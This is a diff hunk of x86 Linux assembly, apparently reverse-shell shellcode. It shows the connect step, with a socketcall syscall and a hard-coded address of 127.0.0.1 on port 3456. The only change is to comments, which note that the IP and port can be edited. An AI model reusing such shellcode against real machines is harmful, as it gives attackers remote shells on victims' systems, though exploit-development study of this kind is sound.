@@ -27,8 +27,8 @@ mov edi, eax  ; save sockfd
 push byte 0x66 ;  push syscall 102 in hex = 0x66
 pop eax
 add ebx,2 ; add 2 to ebx to equal 3 for connect
-push 0x0100007f  ;127.0.0.1 is pushed on to the stack
-push word 0x800d ;<--- port 3456 in reverse hex {can be edited here to change port}
+push 0x0100007f  ;<--127.0.0.1 pushed on to the stack{can be edited here to change IP}
+push word 0x800d ;<--port 3456 in reverse hex {can be edited here to change port}
 push word 0x2  ; AF_NET = 2
 
 mov ecx, esp ;ecx has a pointer to the struct
